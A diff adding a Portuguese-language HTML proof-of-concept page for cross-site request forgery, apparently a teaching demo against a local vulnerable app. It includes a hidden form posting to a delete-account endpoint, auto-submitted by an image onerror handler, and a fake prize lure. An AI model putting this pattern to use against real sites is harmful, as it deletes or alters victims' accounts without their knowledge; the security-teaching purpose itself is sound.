@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Site Malicioso - CSRF PoC</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #fdd; color: #a00; text-align: center; padding-top: 50px; }
+        h1 { color: #d00; }
+        p { font-size: 1.2em; }
+        .hidden-form { display: none; }
+    </style>
+</head>
+<body>
+    <h1>Site Malicioso!</h1>
+    <p>Você ganhou um prêmio! Clique para ver!</p>
+    <p>(Na verdade, este site está tentando excluir sua conta em outra aplicação se você estiver logado!)</p>
+
+    <!-- Este formulário será enviado automaticamente via JavaScript -->
+    <form id="csrfForm" action="http://localhost:3000/delete-account-action" method="POST" class="hidden-form">
+        <!-- Nenhum token CSRF é necessário, o que torna a aplicação alvo vulnerável -->
+    </form>
+
+    <img src="https://example.com/some_image.png" onerror="document.getElementById('csrfForm').submit();" alt="Click Me!">
+
+    <script>
+        // Alternativamente, enviar diretamente após um pequeno atraso
+        // setTimeout(function() {
+        //     document.getElementById('csrfForm').submit();
+        //     console.log('Formulário CSRF enviado!');
+        // }, 1000); // Envia após 1 segundo
+    </script>
+</body>
+</html>
